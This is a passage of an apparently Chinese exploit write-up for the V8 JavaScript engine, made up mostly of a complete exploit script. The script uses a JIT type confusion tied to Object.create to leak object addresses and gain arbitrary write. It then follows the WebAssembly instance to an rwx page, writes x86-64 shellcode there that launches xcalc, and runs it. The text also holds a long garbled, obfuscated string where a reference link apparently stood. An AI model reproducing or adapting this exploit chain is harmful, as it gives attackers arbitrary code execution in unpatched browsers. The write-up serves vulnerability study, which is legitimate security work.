
与前面任意地址读是差不多的，这时，我们就可以找到wasm的`rwx`段，并向其中写入我们的shellcode了，先对wasm初始化：

```javascript
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var wasm = wasmInstance.exports.main;

wasm();
```

`wasmCode`我是采用在线网站生成的：97eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4j5i4y4V1K9#2)9J5k6h3N6A6N6r3S2#2j5W2)9J5k6h3W2G2i4K6u0r3g2$3q4K6L8f1k6A6k6r3c8D9k6g2)9J5c8W2!0q4c8W2!0n7b7#2)9^5b7#2!0q4y4#2)9&6b7W2!0n7y4q4!0q4y4W2)9^5c8g2!0m8y4g2!0q4y4#2)9&6y4q4!0m8z5q4!0q4y4g2!0m8c8g2)9^5x3#2!0q4z5g2!0n7b7W2)9&6z5q4!0q4z5q4!0m8c8g2!0m8y4q4!0q4y4#2)9&6b7g2)9^5y4q4!0q4z5g2)9^5x3W2!0m8x3#2!0q4y4q4!0n7z5q4!0m8b7b7`.`return 42`就行，在初始化之后，我们需要找到`rwx`段所在的位置，这个调试慢慢找就行了，我这里给出我找到的路线：

```javascript
wasmFunctionaddr ==>
SharedInfo ==>
WasmExportedFunctionData ==>
Instance ==>
Instance + 0xe8 + 0x8 (直接vmmap看就能发现这里是有rwx权限的)
```

然后利用`dataview`写入shellcode就可以了。
最终exp如下：

```javascript
var buf = new ArrayBuffer(16);
var f64 = new Float64Array(buf);
var i32 = new Uint32Array(buf);

function f_to_i(target)
{
f64[0] = target;
let tmp = Array.from(i32);
return tmp[1] * 0x100000000 + tmp[0];
}

function i_to_f(target)
{
let tmp = [];
tmp[0] = parseInt(target % 0x100000000);
tmp[1] = parseInt((target - tmp[0]) / 0x100000000);
i32.set(tmp);
return f64[0];
}

function hex(target){ return target.toString(16).padStart(16,"0"); }

function gc()
{
for(var i=0;i<((1024 * 1024)/0x10);i++)
{
var a = new String();
}
}

function create(){
var obj = {a:123};
for(let i = 0;i<30;i++){
eval(`obj.${'b'+i} = 456 - i`);
}
return obj;
}

let obj_array=[];

/* function triggerVul(obj){
obj.a;
this.Object.create(obj);
eval(`
${find_obj.map((b) => `let ${b} = obj.${b};`).join('\n')}
`);
} */

function find(){
for (let i = 0;i<40;i++){
obj_array[i] = 'b'+i;
}
eval(`
function triggerVul(obj){
obj.a;
this.Object.create(obj);
${obj_array.map((b) => `let ${b} = obj.${b};`).join('\n')}
return [${obj_array.join(', ')}];
}
`);
for(let i = 0;i<10000;i++){
let obj = create();
let array = triggerVul(obj);
for(let j = 0;j<array.length;j++){
if(array[j]!=456-j && array[j]<456 && array[j]>(456-39)){
console.log("\033[1;32m[*] find two : \033[0m"+'b'+j+" and " + 'b'+(456-array[j]));
return ['b'+j , 'b' + (456-array[j])];
}
}
}
}

let C1 = 0;
let C2 = 0;

function leak_obj_create(target){
var obj = {a:123};
for(let i = 0; i<30; i++){
if('b'+i!=C1 && 'b'+i!=C2){
eval(`obj.${'b'+i} = 1.1 ;`);
}
else if('b'+i==C1){
eval(`obj.${C1} = {c10:1.1,c11:2.2 };`);
// eval(`obj.${C1} = 1.1 ;`)
}
else if('b'+i==C2){
eval(`obj.${C2} = {c20:target};`);
// eval(`obj.${C2} = target;`)
}
}
return obj;
}

function leak(target){
eval(`
function triggerVul(target)
{
target.a;
this.Object.create(target);
return target.${C1}.c10;
}
`);
for(let i = 0; i<10000; i++){
var obj = leak_obj_create(target);
var leak_addr = triggerVul(obj);
if(leak_addr!=1.1 && leak_addr!=undefined){
console.log("\033[1;32m[*] target addr is leaked: \033[0m " + (f_to_i(leak_addr)));
return f_to_i(leak_addr);
}
}
}

function write_obj_create(target){
var obj = {a:123};
for(let i = 0; i<30; i++){
if('b'+i!=C1 && 'b'+i!=C2){
eval(`obj.${'b'+i} = {};`);
}
else if('b'+i==C1){
eval(`obj.${C1} = {c10:{c11:1.1,c12:2.2 }};`);
}
else if('b'+i==C2){
eval(`obj.${C2} = {c20:target};`);
}
}
return obj;
}

function write(target,data){
eval(`
function triggerVul(target,data){
target.a;
this.Object.create(target);
let sign = target.${C1}.c10.c12;
target.${C1}.c10.c12 = (data);
return sign;
}
`);
for(let i = 0; i<10000; i++){
var obj = write_obj_create(target);
var sign = triggerVul(obj,data);
if(sign!=2.2){
console.log("\033[1;32m[*] target addr has been write with data: \033[0m " + f_to_i(data));
return ;
}
}
console.log("\033[1;31m[!]Failed to Write Data! \033[0m ");
}

[C1,C2] = find();
var buffer = new ArrayBuffer(0x200);

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var wasm = wasmInstance.exports.main;

wasm();

var wasm_addr = leak(wasm);
write(buffer,i_to_f(wasm_addr));

let dataview = new DataView(buffer);
shared_info = f_to_i(dataview.getFloat64(0x18-0x1,true));
console.log("\033[1;32m[*] shared info addr is leaked: \033[0m " + (shared_info));

write(buffer,i_to_f((shared_info)));
WasmFunc = f_to_i(dataview.getFloat64(0x8-0x1,true));
console.log("\033[1;32m[*] wasm Func addr is leaked: \033[0m " + (WasmFunc));

write(buffer,i_to_f(WasmFunc));
Instance = f_to_i(dataview.getFloat64(0x10-0x1,true));
console.log("\033[1;32m[*] wasm Instance addr is leaked: \033[0m " + (Instance));

write(buffer,i_to_f(Instance));
wasm_rwx = f_to_i(dataview.getFloat64(0xe8+0x8-0x1,true));
console.log("\033[1;32m[*] wasm rwx addr is leaked: \033[0m " + (wasm_rwx));

write(buffer,i_to_f(wasm_rwx));

var shellcode = [72,184,1,1,1,1,1,1,1,1,80,72,184,46,121,98,96,109,98,1,1,72,49,4,36,72,184,47,117,115,114,47,98,105,110,80,72,137,231,104,59,49,1,1,129,52,36,1,1,1,1,72,184,68,73,83,80,76,65,89,61,80,49,210,82,106,8,90,72,1,226,82,72,137,226,72,184,1,1,1,1,1,1,1,1,80,72,184,121,98,96,109,98,1,1,1,72,49,4,36,49,246,86,106,8,94,72,1,230,86,72,137,230,106,59,88,15,5];

for(let i=0;i<shellcode.length;i++){
dataview.setUint8(i,shellcode[i]);
}

wasm();

// %DebugPrint(buffer);
// %DebugPrint(wasm);
// %DebugPrint(shared_info);
// %SystemBreak();
```
